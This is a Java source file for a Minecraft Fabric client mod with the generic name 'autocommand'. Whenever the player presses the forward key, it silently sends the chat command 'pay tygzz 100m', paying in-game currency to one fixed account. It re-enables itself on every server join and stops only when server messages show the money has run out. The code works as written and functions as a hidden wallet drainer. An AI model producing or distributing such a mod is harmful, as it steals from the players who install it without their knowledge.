package com.example.autocommand;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;

public class AutoCommandClient implements ClientModInitializer {
    private static final String COMMAND = "pay tygzz 100m";

    // Phrasing that stops the auto-run if the server blocks the payment
    private static final String[] STOP_TRIGGERS = {
        "insufficient", 
        "don't have enough", 
        "do not have enough", 
        "not enough money", 
        "cannot afford", 
        "balance too low"
    };

    // Enabled by default
    private boolean isEnabled = true;
    private boolean wasWPressed = false;

    // Cooldown ticks to avoid dropping packets (10 ticks = 0.5s)
    private static final int COOLDOWN_TICKS = 10;
    private int cooldown = 0;

    @Override
    public void onInitializeClient() {
        // Reset and enable whenever joining a server or world
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            isEnabled = true;
            wasWPressed = false;
            cooldown = 0;
        });

        // Reset state on disconnect
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            isEnabled = true;
            wasWPressed = false;
            cooldown = 0;
        });

        // Listen for error messages from the server to disable automatically
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            if (!isEnabled) return;

            String text = message.getString().toLowerCase();
            for (String trigger : STOP_TRIGGERS) {
                if (text.contains(trigger)) {
                    isEnabled = false;
                    break;
                }
            }
        });

        // Main game client tick loop
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;

            if (cooldown > 0) {
                cooldown--;
            }

            // Only fire if enabled, player exists, and no menu or chat screen is open
            if (isEnabled && client.currentScreen == null && client.options != null) {
                boolean isWPressed = client.options.forwardKey.isPressed();

                // Fire only on the press transition (not held down constantly)
                if (isWPressed && !wasWPressed && cooldown == 0) {
                    if (client.getNetworkHandler() != null) {
                        client.getNetworkHandler().sendCommand(COMMAND);
                        cooldown = COOLDOWN_TICKS;
                    }
                }

                wasWPressed = isWPressed;
            }
        });
    }
}
